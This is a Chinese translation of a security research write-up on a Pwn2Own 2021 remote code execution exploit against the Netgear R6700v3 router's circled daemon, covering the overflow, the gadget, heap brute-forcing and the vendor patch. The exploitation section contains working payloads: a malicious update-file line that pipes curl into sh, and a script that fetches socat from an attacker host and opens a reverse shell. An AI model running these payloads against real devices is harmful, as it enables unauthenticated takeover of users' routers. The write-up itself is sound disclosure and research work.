[#]: subject: PWN2OWN AUSTIN 2021 : DEFEATING THE NETGEAR R6700V3
[#]: via: "https://www.synacktiv.com/en/publications/pwn2own-austin-2021-defeating-the-netgear-r6700v3.html"
[#]: author: "Kevin Denis, Antide Petit"
[#]: collector: "Licae"
[#]: translator: "b1lack"
[#]: reviewer: "firmianay"
[#]: publisher: "firmianay"
[#]: url: " "

PWN2OWN AUSTIN 2021 : 攻破 NETGEAR R6700V3
=======

- [PWN2OWN AUSTIN 2021 : 攻破 NETGEAR R6700V3](#pwn2own-austin-2021--攻破-netgear-r6700v3)
    - [介绍](#介绍)
    - [漏洞研究](#漏洞研究)
      - [负责更新的功能](#负责更新的功能)
      - [获取文件](#获取文件)
      - [POC](#poc)
    - [EXPLOITATION](#exploitation)
      - [策略](#策略)
        - [重定向到执行](#重定向到执行)
        - [使用已知的字符串通过系统执行](#使用已知的字符串通过系统执行)
      - [找到“magic” gadget](#找到magic-gadget)
      - [强行使用堆内存](#强行使用堆内存)
      - [优化载荷](#优化载荷)
    - [利用脚本和使用](#利用脚本和使用)
    - [补丁](#补丁)
    - [结论](#结论)

ZDI 每年组织两次以破解硬件和软件为目标的竞赛。2021年11月，在奥斯汀，黑客试图破解硬件设备，如打印机、路由器、电话、家庭自动化设备、NAS 等。这篇博文描述了我们如何成功地从 WAN 接口接管了一个 Netgear 路由器。

### 介绍

本文描述了在 NETGEAR 夜鹰智能 Wi-Fi 路由器（R6700 AC1750）的 WAN 接口上发现的一个无需认证的远程代码执行漏洞。该漏洞位于 `/bin/circled` 内的二进制文件中，运行在 Netgear 路由器上。该漏洞可以被路由器 WAN  端的攻击者远程利用，而无需身份验证。circled 守护进程从 web 服务器获取一个 `circleinfo.txt` 文件，解析该文件时可能会触发缓冲区溢出。通过在 web 服务器中放置恶意文件并重定向路由器来下载它（通过 DNS 重定向或 TCP 重定向），攻击者可以执行任意代码。由于 circled 在 root 权限下运行，攻击者获得了路由器上的全部权限。该漏洞已收录到 [CVE-2022-27646][1] 和 [CVE-2022-27644][2] 中。

### 漏洞研究

Circled 是一个第三方守护程序，可以让父进程控制 Netgear 路由器。在 GRIMM 的一篇[博文][3]中可以找到对该服务和以前的一个漏洞的良好分析。本节描述了 `/bin/circled` 二进制文件中的一个新漏洞。需要注意的是，守护进程是在默认路由器配置中启动的，即使它没有被配置。

守护进程 `/bin/circled`，在 Netgear 固件版本 `R6700v3-V1.0.4.120_10.0.91` 中，它的 SHA1 哈希是 `ac86472cdeccd01165718b1b759073b9e6b665e9`。

#### 负责更新的功能

我们选择分析该服务的更新机制。主程序在启动后不久分叉，一个进程负责下载和检查数据库版本和引擎版本。这个检查在启动时启动，之后每两个小时启动一次。在崩溃的情况下，进程将重新启动。

位于 `0xCE38` 的函数（我们将其命名为 `updating_database`）解析 `/tmp/circleinfo.txt` 文件，以检查是否有任何更新要应用。解析读取文本文件的每一行，然后在两个堆栈变量中写入数据，而不检查它们的大小，从而导致典型的堆栈缓冲区溢出。

```c
int __fastcall updating_database(int a1, const char *update_server)
 {
 // (...)
 char line[1020]; // [sp+894h] [bp-4FCh] BYREF
 char db_checksum_val[256]; // [sp+D94h] [bp+4h] BYREF
 char db_checksum[256]; // [sp+E94h] [bp+104h] BYREF
 // (...)
 v7 = fopen("/tmp/circleinfo.txt", "r");
 if ( v7 )
 {
  line[0] = 0;
  while ( fgets(line, 1024, v7) )
  {
   if ( sscanf(line, "%s %s", db_checksum, db_checksum_val) == 2
      && !strcmp(db_checksum, "db_checksum") ) {
      // (...)
      break;
   }
  // (...)
```

正如我们在这段代码片段中看到的，`line` 变量最多可以处理 1024 个字符，尽管 `db_checksum_val` 和 `db_checksum` 在 `sscanf` 中只有 256 个字符。这两个变量都位于堆栈的末尾，这允许我们触发堆栈溢出。

#### 获取文件

位于 `0xE2D8` 的函数（我们命名为 `retrieve_circleinfo_txt`）的从远程服务器获取 `circleinfo.txt` 文件，并将其复制到 `/tmp` 文件夹中。函数 `url_retrieve`（位于 `0xC904`）用于下载文件。下载是通过 https 服务器完成的，但该功能不检查证书：

```c
snprintf(curl_cmdline, v8 - 1, "%s %s %s/%s", "curl -s -m 180 -k -o", output, server, path);
printf("%s: Executing '%s'\n", "url_retrieve", curl_cmdline);
system(curl_cmdline);
free(curl_cmdline);
```

curl 提供的 -k 选项可以显式地绕过证书检查。换句话说，这意味着任何人都可以模拟更新服务器。

可以下载合法文件进行检查：

```shell
$ curl https://http.fw.updates1.netgear.com/sw-apps/parental-control/circle/r6700v3/https/circleinfo.txt
firmware_ver 2.3.0.1
database_ver 3.2.1
platforms_ver 2.15.2
db_checksum 80f34399912c29a9b619193658d43b1c
firmware_size 1875128
database_size 8649020
$
```

#### POC

为了验证这个漏洞，我们将 Netgear 路由器配置为使用我们自己的 DNS 服务器，这允许我们将查询重定向到我们自己的服务器。我们选择服务一个包含 1000 个'A'，后跟一个空格和一个'A'的文件：

```shell
$ cat circleinfo.txt
A(..1000x..)A A
$
```

在 circled 日志（`/tmp/circledinfo.log`）中，我们可以看到进程在循环中崩溃并重新启动。

```shell
Sat Sep 4 01:19:10 2021 ERROR: loader exited, forking new loader now ...
```

### EXPLOITATION

在本节中，我们将描述如何将此漏洞转化为远程命令执行的完整工作漏洞。

#### 策略

在我们的设置中，我们是 Netgear 的 DHCP 服务器。我们可以是 DNS 服务器和 https 更新服务器(由于 curl -k，任何自签名证书都将被接受)。

##### 重定向到执行

在处理堆栈溢出时，可以将执行流重定向到堆栈，但在此上下文中，堆栈是不可执行的。通常，不可执行的内存区域问题可以用面向返回编程（Return Oriented Programming, ROP）通过链接所谓的“gadget”来解决，但我们发现了一个懒惰的“one gadget”解决方案，它不是特别完美，但有工作的优点。

该漏洞允许我们溢出堆栈和重写一些保存的寄存器，$R4 到 $R11 和 $PC。我们希望将流重定向到某个已知的可执行内存区域。在这个设备上，ASLR 是不完全的，我们的二进制文件没有被编译为 PIE，因此代码位于 `0x8000`。发生溢出的原因是格式字符串，这意味着我们不能写入空字节（字符串末尾的一个除外）。

我们发现了一个 gadget，它允许我们用一个控制参数调用 `system`，这就是我们所使用的。

##### 使用已知的字符串通过系统执行

我们在这里唯一控制的是用于漏洞的长字符串。它是用 `sscanf` 读取的，因此我们不能注入空字节、空格或返回回车，但它足以构建一个 shell 脚本。

代码操作的字符串在某个时候结束在堆中。当 `/proc/sys/kernel/randomize_va_space` 被设为 1 时，我们知道堆将总是位于数据段之后，并且由于二进制文件不是位置独立可执行文件（PIE），地址将总是相同的。

我们选择遵循这个思路，用 $R0 指向堆内存中的某个位置来调用 `system`。当进程在崩溃后重新启动时，我们几乎可以无限地尝试寻找合适的地址，唯一的限制是由 Pwn2Own 上下文中的 ZDI 规则设置的最大时间条件。

#### 找到“magic” gadget

通过探索所有指向 `system` 函数的 gadget ，我们可以看到偏移量 `0xEC78`：

```shell
$ arm-linux-gnueabi-objdump -d circled | grep -B2 system
 (...)
 --
 ec78:   e59d2084   ldr   r2, [sp, #132] ; 0x84
 ec7c:   e0840002   add   r0, r4, r2
 ec80:   ebffea06   bl    94a0 
 --
$
```

我们用溢出来控制 $R4 的值，因此我们可以强制 ADD R0,R4,R2 的结果最终控制 $R0，从而控制 `system` 参数。

$R2 的值可以找到，它是一个参数，用于在触发寄存器恢复的 `ret` 指令之前使用的格式字符串，并且总是等于 `0xFFFF7954`。

堆边界是 `0x1c000 - 0x21000`，因此我们可以通过向其添加 `0x86ac` 来针对这些地址，因为将用上面提到的gadget 减去它。我们最终得到了像 `0x000266ac` 这样的值，它需要用一个空字节写入。

该漏洞可以被触发两次，格式为：`%s %s`。这两个变量都可能溢出堆栈和重写寄存器。我们可以使用第一种格式溢出所有保存的寄存器，直到 $PC，第二种格式溢出所保存的 $R4 中的三个字节。终止的空字节将放入所需的值。

通过这两个溢出，我们可以用一个受控地址调用 `system` 函数。

#### 强行使用堆内存

我们知道堆将包含 circleinfo.txt 字符串的一部分。一种策略可以是在不带任何空格或回车的情况下写入命令，然后逐个尝试堆中的每个地址，直到找到命令的第一个字符。我们知道更新过程会在崩溃后重新启动，因此我们最终将获得正确的地址。

正如我们在动态分析中发现的那样，字符串的开头通常会被后续的堆分配覆盖，因此我们将命令几乎放在字符串的末尾。`circleinfo.txt` 文件将包含这一行：

```shell
$ cat /tmp/circleinfo.txt
AA(...)curl${IFS}-k${IFS}https://A.B.C.D/exploit|sh;<saved_pc> AA(...)curl${IFS}-k${IFS}https://A.B.C.D/exploit|sh;<saved_R4>
```

包含：
- saved_PC 等于魔术 gadget \x78\xEC (LSB形式)
- saved_R4 从 0x246ac 到 0x296ac 解析堆

我们使用一个网络服务器，它为每个请求提供不同的文件与不同的保存在 $R4。

#### 优化载荷

强制堆地址是可行的，但由于循环的二进制中的内部计时器(每次尝试间隔 3 或 4 秒)，速度很慢。为了阻止攻击，我们选择用 256 字节的步骤解析堆，并在 shell 脚本之前使用特定的负载。

这个有效负载由 260 个“a”和一个分号“;”以及后面的命令组成。如果 $R0 点在长' aaa '部分的任何地方，我们以调用结束：

```shell
system("a(...)a;curl${IFS}-k${IFS}https://A.B.C.D/exploit|sh;")
```

shell 处理一个 'a(...)a' 例如一个命令，不能执行它（带有“command not found error”），然后继续使用 curl 命令，漏洞利用也是如此。

这个策略被发现是有效的，我们很快就得到了一个 shell。

“exploit”其实很简单。我们下载一个 socat 二进制文件并启动一个反向 shell。虽然这个第二阶段是不必要的，但我们更愿意让第一个有效负载尽可能小（curl 管道到 shell），以最大限度地增加在堆内存中发现它的机会。我们能够在“exploit”中输入任何命令，因此我们在 Netgear 路由器上实现了一个灯光显示：

```shell
#!/bin/sh
#Any .com name will point to attacker machine, thanks to dnsmasq config
HOST=bla.com
PORT=4242
# Download socat for the reverse shell
curl -k https://${HOST}/s/socat -o /tmp/socat
chmod +x /tmp/socat
# Reverse shell
# Necessary to manually grab the IP because the statically linked socat can't resolve it
IP=$(ping -c1 ${HOST} | head -n1 | cut -d'(' -f2 | cut -d')' -f1)
/tmp/socat exec:/bin/sh,pty,stderr,setsid,sigint,sane tcp:${IP}:${PORT} &
# And now, a small lightshow :-)
while true; do
  leddown
  sleep 1
  ledup
  sleep 1
done
```

### 利用脚本和使用

根据这个文档，已经开发了一些脚本来证明这种利用。

所有这些脚本都可以从我们的 [GitHub 库][4]下载，并附有如何使用它们的说明。

### 补丁

为了弥补这个漏洞，Netgear 发布了 1.0.4.126 版本的补丁。

首先，他们删除了 curl 命令行中的 `-k` 开关，这将阻止我们模拟更新服务器。然后，他们修改了解析器：

```c
while ( fgets(line, 1024, v7) )
{
   if ( sscanf(line, "255%s %255s", db_checksum, db_checksum_val) == 2
        && !strcmp(db_checksum, "db_checksum") )
  (...)
```
%255s 限制将防止缓冲区溢出。

### 结论

本文已经展示了如何在 Netgear R6700v3 路由器上实现 WAN端未授权 RCE 。该漏洞位于 circled 的守护进程中，它下载了一个触发缓冲区溢出的恶意更新文件。这允许在目标上调用任意  shell 命令，从而在攻击者计算机上启动一个反向 shell。

我们也要感谢参与 Pwn2Own 项目的 ZDI 团队，感谢他们的建议和对活动的完美组织。我们希望明年再见到你们！

--------------

via: https://www.synacktiv.com/en/publications/pwn2own-austin-2021-defeating-the-netgear-r6700v3.html

作者：DKevin Denis, Antide Petit
选题：[Licae](https://github.com/Licae)
译者：[b1lack](https://github.com/b1lack)
校对：[firmianay](https://github.com/firmianay)

本文由 [VulnTotal翻译组](https://github.com/VulnTotal-Team/TranslateProject) 原创编译，[VulnTotal安全团队](https://github.com/VulnTotal-Team) 荣誉推出

[1]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-27646
[2]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-27644
[3]: https://blog.grimm-co.com/2021/09/mama-always-told-me-not-to-trust.html
[4]: https://github.com/synacktiv/Netgear_Pwn2Own2021
